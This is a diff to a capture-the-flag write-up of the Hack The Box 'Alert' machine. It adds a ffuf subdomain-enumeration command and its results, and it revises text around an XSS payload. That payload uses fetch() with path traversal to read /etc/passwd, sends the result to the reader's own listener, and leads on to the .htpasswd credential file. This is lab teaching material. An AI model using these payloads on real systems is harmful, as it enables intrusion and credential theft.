@@ -152,7 +152,20 @@ Looks like we have a few hits this time:
 - server-status
 - uploads
 
-However sub-domain enumeration reveled nothing for me.
+Next is sub domain enumeration.
+
+```
+ffuf -u http://alert.htb -H "Host:FUZZ.alert.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fc 301 -c -of md -o alert.htb-subdomain-ffuf.md
+```
+
+### FFUF Report
+
+  | FUZZ | URL | Redirectlocation | Position | Status Code | Content Length | Content Words | Content Lines | Content Type | Duration | ResultFile | ScraperData | Ffufhash|
+  | :- | :-- | :--------------- | :---- | :------- | :---------- | :------------- | :------------ | :--------- | :----------- | :------------ | :-------- |
+  | statistics | http://alert.htb |  | 1261 | 401 | 467 | 42 | 15 | text/html; charset=iso-8859-1 | 274.901418ms |  |  | 540394ed|
+
+The new addition here is:
+- statistics.alert.htb
 
 Now we head over to [Alert.htb](http://alert.htb)
 
@@ -239,7 +252,7 @@ Neat, now we need to take that over to a [url decoder](https://www.urldecoder.or
 
 ![](./.images/Screenshot_Alert-XSS-9.png)
 
-Okay, that looks pretty useless, but at least it worked. Let's see if we can craft the payload to exploit a Local File Inclusion (LFI) vulnerability. Let's make a file called LFI.md containing the following:
+Okay, that gives us the parameter needed to read files. Let's see if we can craft the payload to exploit a Local File Inclusion (LFI) vulnerability. Let's make a file called LFI.md containing the following:
 
 ```
 <script>
@@ -251,7 +264,7 @@ fetch("http://alert.htb/messages.php?file=../../../../../etc/passwd")
 </script>
 ```
 
-This should grab a copy of the /etc/passwd file, again don't forget to adjust your IP address and port to match your settings...
+This should grab a copy of the /etc/passwd file, again don't forget to adjust the IP address and port to match your settings...
 
 ![](./.images/Screenshot_Alert-XSS-10.png)
 
@@ -309,4 +322,4 @@ david:x:1001:1002:,,,:/home/david:/bin/bash
 </pre>
 ```
 
-
+Finally, let's see if we can view the .htpasswd file. The .htpassd file that stores user names and their encrypted passwords, used for basic authentication. The .htpasswd file can be placed in any directory, but it's common to store it in a secure location, such as /etc/apache2/ or /usr/local/apache/conf/.
